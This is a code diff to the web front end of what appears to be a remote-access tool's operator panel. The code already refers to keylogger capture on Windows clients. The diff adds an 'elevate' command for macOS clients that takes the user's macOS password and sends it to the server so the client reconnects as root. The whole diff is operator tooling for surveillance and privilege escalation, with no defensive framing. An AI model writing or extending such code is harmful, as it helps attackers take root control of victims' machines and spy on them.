@@ -195,6 +195,11 @@ function applyMenuSupportRules(clientId) {
     isWindows,
     "Keylogger capture is only fully supported on Windows clients.",
   );
+
+  const elevateBtn = menu.querySelector('[data-action="elevate"]');
+  if (elevateBtn) {
+    elevateBtn.style.display = platform === "darwin" ? "" : "none";
+  }
 }
 
 async function loadCurrentUser() {
@@ -931,6 +936,32 @@ menu.addEventListener("click", async (e) => {
   if (!isClientOnline(contextCard)) {
     alert("Client is offline. This command can only be used while the client is online.");
     closeMenu(clearContext);
+    return;
+  }
+
+  if (action === "elevate") {
+    const password = prompt("Enter the user's macOS password for sudo elevation:");
+    if (!password) {
+      closeMenu(clearContext);
+      return;
+    }
+    try {
+      const res = await fetch(`/api/clients/${contextCard}/command`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "elevate", password }),
+      });
+      const data = await res.json().catch(() => ({}));
+      if (data.ok) {
+        alert(data.message || "Elevation successful — client will reconnect as root.");
+      } else {
+        alert(data.error || data.message || "Elevation failed.");
+      }
+    } catch (err) {
+      alert("Elevation request failed: " + err.message);
+    }
+    closeMenu(clearContext);
+    setTimeout(() => loadWithOptions({ force: true }), 2000);
     return;
   }
 
